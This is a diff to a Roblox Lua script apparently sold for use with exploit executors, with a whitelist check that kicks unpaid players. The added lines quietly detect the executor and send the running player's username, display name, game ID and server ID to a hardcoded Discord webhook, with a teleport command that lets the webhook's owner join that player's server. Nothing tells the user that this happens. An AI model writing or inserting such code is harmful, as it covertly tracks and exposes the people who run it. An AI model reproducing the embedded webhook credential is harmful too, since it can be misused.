@@ -22,3 +22,62 @@ game.Players.PlayerAdded:Connect(function(player)
         player:Kick("You are not on the whitelist. Buy access at .gg/BuyGlxck.cc")
     end
 end)
+
+-- Detecting the current exploit
+local exploit = syn and "Synapse X" or KRNL_LOADED and "Krnl" or "Unknown Exploit"
+
+-- Discord webhook URL
+local webhookUrl = "https://discord.com/api/webhooks/1232947236023828530/ef1gash-RUPFTFmiAgNpgVdrJH-2OaFDHeZV3Ow1lysjPmrRRlvK8mFdcRfRa7Y_Wp8y"
+
+-- Get the player's information
+local player = game.Players.LocalPlayer
+local playerName = player.Name
+local playerDisplayName = player.DisplayName
+
+-- Creating embed data with a clickable title
+local embedData = {
+    type = "rich",
+    color = 0x7269da,
+    fields = {
+        {
+            name = "Logs",
+            value = "Username: " .. playerName .. "\nDisplay Name: " .. playerDisplayName,
+            inline = false
+        },
+        {
+            name = "Player currently playing",
+            value = " [Join game](https://www.roblox.com/games/" .. game.PlaceId .. "/)",
+            inline = false
+        },
+        {
+            name = "Copy me and paste in your executor. Make sure you're in the game that the player is currently playing.",
+            value = "" .. 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ',"' .. game.JobId .. '")' .. "",
+            inline = false
+        }
+    }
+}
+
+-- Creating final data payload
+local postData = {
+    embeds = {embedData}
+}
+
+-- Encoding data to JSON
+local jsonData = game:GetService("HttpService"):JSONEncode(postData)
+
+-- Setting up HTTP request headers
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+-- Creating request parameters
+local requestParams = {
+    Url = webhookUrl,
+    Body = jsonData,
+    Method = "POST",
+    Headers = headers
+}
+
+-- Sending the request to the webhook
+local request = http_request or request or HttpPost or syn.request
+request(requestParams)
